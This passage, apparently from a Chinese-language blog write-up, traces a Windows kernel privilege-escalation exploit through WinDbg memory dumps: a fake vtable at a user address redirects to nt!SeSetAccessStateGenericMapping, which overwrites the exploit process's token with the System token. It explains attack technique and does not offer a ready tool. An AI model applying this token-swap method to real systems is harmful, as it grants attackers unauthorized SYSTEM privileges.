style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd0d0<span style="color:#ae81ff">38</span><span style="color:#ae81ff">13</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8.</span>..............</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd0e0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">38</span><span style="color:#ae81ff">14</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> .......<span style="color:#ae81ff">.8</span>.......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1468</span></span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de4d8<span style="color:#ae81ff">08</span> f0 fd c1<span style="color:#ae81ff">30</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">08</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#ae81ff">.0</span>...........</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de4e8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#ae81ff">38</span> bb<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........<span style="color:#ae81ff">.8</span>......</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de4f8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de508<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de518<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de528<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de538<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de548<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span></code></pre></div><p>查看此时的pContainer对象</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db bb3810</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3810<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3820<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3830<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3840<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3850<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3860<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3870<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3880<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span></code></pre></div><p>vtable</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq<span style="color:#ae81ff">5000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23456789</span> fffff807<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">15ff</span><span style="color:#ae81ff">2</span>da0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000010</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> fffff807<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">13</span>a51cb0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000020</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000030</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000040</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000050</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000060</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000070</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><p>执行到nt!SeSetAccessStateGenericMapping函数时，rdx指向内存0xFFFFFFFF，该内存存储了system token的地址，将其写入到rax+8指向的地址中，此处为自身token地址，也就是将system token地址写入到了自身token地址中，即把自身token 替换成了system token达成提权。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>system权限token</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dp rdx L6</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span>ffffffff ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">03e616</span>fc<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000000f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000001f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">!</span>process<span style="color:#ae81ff">4</span><span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span>Searching<span style="color:#66d9ef">for</span> Process with Cid<span style="color:#f92672">==</span><span style="color:#ae81ff">4</span></span></span><span style="display:flex;"><span>PROCESS ffffb1838ce87180</span></span><span style="display:flex;"><span> SessionId: none Cid:<span style="color:#ae81ff">0004</span> Peb:<span style="color:#ae81ff">00000000</span> ParentCid:<span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span> DirBase:<span style="color:#ae81ff">001</span>ad000 ObjectTable: ffff8e8603e57d40 HandleCount:<span style="color:#ae81ff">2731.</span></span></span><span style="display:flex;"><span> Image: System</span></span><span style="display:flex;"><span> VadRoot ffffb1838ce94920 Vads<span style="color:#ae81ff">6</span> Clone<span style="color:#ae81ff">0</span> Private<span style="color:#ae81ff">22.</span> Modified<span style="color:#ae81ff">4650.</span> Locked<span style="color:#ae81ff">0.</span></span></span><span style="display:flex;"><span> DeviceMap ffff8e8603e35ae0</span></span><span style="display:flex;"><span> Token ffff8e8603e616f0</span></span><span style="display:flex;"><span> ElapsedTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">58</span><span style="color:#f92672">:</span><span style="color:#ae81ff">07.536</span></span></span><span style="display:flex;"><span> UserTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00.000</span></span></span><span style="display:flex;"><span> KernelTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">03.093</span></span></span><span style="display:flex;"><span> QuotaPoolUsage[PagedPool]<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span> QuotaPoolUsage[NonPagedPool]<span style="color:#ae81ff">272</span></span></span><span style="display:flex;"><span> Working Set<span style="color:#a6e22e">Sizes</span> (now,min,max) (<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">450</span>) (<span style="color:#ae81ff">196</span>KB,<span style="color:#ae81ff">200</span>KB,<span style="color:#ae81ff">1800</span>KB)</span></span><span style="display:flex;"><span> PeakWorkingSetSize<span style="color:#ae81ff">216</span></span></span><span style="display:flex;"><span> VirtualSize<span style="color:#ae81ff">3</span> Mb</span></span><span style="display:flex;"><span> PeakVirtualSize<span style="color:#ae81ff">14</span> Mb</span></span><span style="display:flex;"><span> PageFaultCount<span style="color:#ae81ff">2325</span></span></span><span style="display:flex;"><span> MemoryPriority BACKGROUND</span></span><span style="display:flex;"><span> BasePriority<span style="color:#ae81ff">8</span></span></span><span style="display:flex;"><span> CommitCharge<span style="color:#ae81ff">49</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">当前权限</span>token</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">!</span>process<span style="color:#ae81ff">0x10cc</span><span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span>Searching<span style="color:#66d9ef">for</span> Process with Cid<span style="color:#f92672">==</span><span style="color:#ae81ff">10</span>cc</span></span><span style="display:flex;"><span>PROCESS ffffb18391fe7080</span></span><span style="display:flex;"><span> SessionId:<span style="color:#ae81ff">1</span> Cid:<span style="color:#ae81ff">10</span>cc Peb: f894963000 ParentCid:<span style="color:#ae81ff">02</span><span style="color:#ae81ff">94</span></span></span><span style="display:flex;"><span> DirBase: a8104000 ObjectTable: ffff8e860b632980 HandleCount:<span style="color:#ae81ff">92.</span></span></span><span style="display:flex;"><span> Image: exp.exe</span></span><span style="display:flex;"><span> VadRoot ffffb18392993580 Vads<span style="color:#ae81ff">57</span> Clone<span style="color:#ae81ff">0</span> Private<span style="color:#ae81ff">4686.</span> Modified<span style="color:#ae81ff">1209.</span> Locked<span style="color:#ae81ff">0.</span></span></span><span style="display:flex;"><span> DeviceMap ffff8e8608a9b1d0</span></span><span style="display:flex;"><span> Token ffff8e860bc6f770</span></span><span style="display:flex;"><span> ElapsedTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">54</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10.168</span></span></span><span style="display:flex;"><span> UserTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00.000</span></span></span><span style="display:flex;"><span> KernelTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00.000</span></span></span><span style="display:flex;"><span> QuotaPoolUsage[PagedPool]<span style="color:#ae81ff">123368</span></span></span><span style="display:flex;"><span> QuotaPoolUsage[NonPagedPool]<span style="color:#ae81ff">8096</span></span></span><span style="display:flex;"><span> Working Set<span style="color:#a6e22e">Sizes</span> (now,min,max) (<span style="color:#ae81ff">5602</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">345</span>) (<span style="color:#ae81ff">22408</span>KB,<span style="color:#ae81ff">200</span>KB,<span style="color:#ae81ff">1380</span>KB)</span></span><span style="display:flex;"><span> PeakWorkingSetSize<span style="color:#ae81ff">5529</span></span></span><span style="display:flex;"><span> VirtualSize<span style="color:#ae81ff">4210</span> Mb</span></span><span style="display:flex;"><span> PeakVirtualSize<span style="color:#ae81ff">4210</span> Mb</span></span><span style="display:flex;"><span> PageFaultCount<span style="color:#ae81ff">8565</span></span></span><span style="display:flex;"><span> MemoryPriority BACKGROUND</span></span><span style="display:flex;"><span> BasePriority<span style="color:#ae81ff">8</span></span></span><span style="display:flex;"><span> CommitCharge<span style="color:#ae81ff">6285</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dp rax<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span> L2</span></span><span style="display:flex;"><span>ffffb183<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">91f</span>e7538 ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>bc6f774<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><p>继续执行，当前进程的Token已经被替换为系统Token</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span></span></span><span style="display:flex;"><span>nt<span style="color:#f92672">!</span>SeSetAccessStateGenericMapping<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span>fffff807<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">15ff</span><span style="color:#ae81ff">2</span>dac c3 ret</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dp ffffb183<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">91f</span>e7080<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4b8</span> L6</span></span><span style="display:flex;"><span>ffffb183<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">91f</span>e7538 ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">03e616</span>fc<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffb183<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">91f</span>e7548<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffb183<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">91f</span>e7558<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">!</span>process<span style="color:#ae81ff">0x10cc</span><span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span>Searching<span style="color:#66d9ef">for</span> Process with Cid<span style="color:#f92672">==</span><span style="color:#ae81ff">10</span>cc</span></span><span style="display:flex;"><span>PROCESS ffffb18391fe7080</span></span><span style="display:flex;"><span> SessionId:<span style="color:#ae81ff">1</span> Cid:<span style="color:#ae81ff">10</span>cc Peb: f894963000 ParentCid:<span style="color:#ae81ff">02</span><span style="color:#ae81ff">94</span></span></span><span style="display:flex;"><span> DirBase: a8104000 ObjectTable: ffff8e860b632980 HandleCount:<span style="color:#ae81ff">92.</span></span></span><span style="display:flex;"><span> Image: exp.exe</span></span><span style="display:flex;"><span> VadRoot ffffb18392993580 Vads<span style="color:#ae81ff">57</span> Clone<span style="color:#ae81ff">0</span> Private<span style="color:#ae81ff">4686.</span> Modified<span style="color:#ae81ff">1209.</span> Locked<span style="color:#ae81ff">0.</span></span></span><span style="display:flex;"><span> DeviceMap ffff8e8608a9b1d0</span></span><span style="display:flex;"><span> Token ffff8e8603e616f0</span></span><span style="display:flex;"><span> ElapsedTime<span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">41.537</span></span></span><span style="display:flex;"><span> UserTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00.000</span></span></span><span style="display:flex;"><span> KernelTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00.000</span></span></span><span style="display:flex;"><span> QuotaPoolUsage[PagedPool]<span style="color:#ae81ff">123368</span></span></span><span style="display:flex;"><span> QuotaPoolUsage[NonPagedPool]<span style="color:#ae81ff">8096</span></span></span><span style="display:flex;"><span> Working Set<span style="color:#a6e22e">Sizes</span> (now,min,max) (<span style="color:#ae81ff">5602</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">345</span>) (<span style="color:#ae81ff">22408</span>KB,<span style="color:#ae81ff">200</span>KB,<span style="color:#ae81ff">1380</span>KB)</span></span><span style="display:flex;"><span> PeakWorkingSetSize<span style="color:#ae81ff">5529</span></span></span><span style="display:flex;"><span> VirtualSize<span style="color:#ae81ff">4210</span> Mb</span></span><span style="display:flex;"><span> PeakVirtualSize<span style="color:#ae81ff">4210</span> Mb</span></span><span style="display:flex;"><span> PageFaultCount<span style="color:#ae81ff">8565</span></span></span><span style="display:flex;"><span> MemoryPriority BACKGROUND</span></span><span style="display:flex;"><span> BasePriority<span style="color:#ae81ff">8</span></span></span><span style="display:flex;"><span> CommitCharge<span style="color:#ae81ff">6285</span></span></span><span 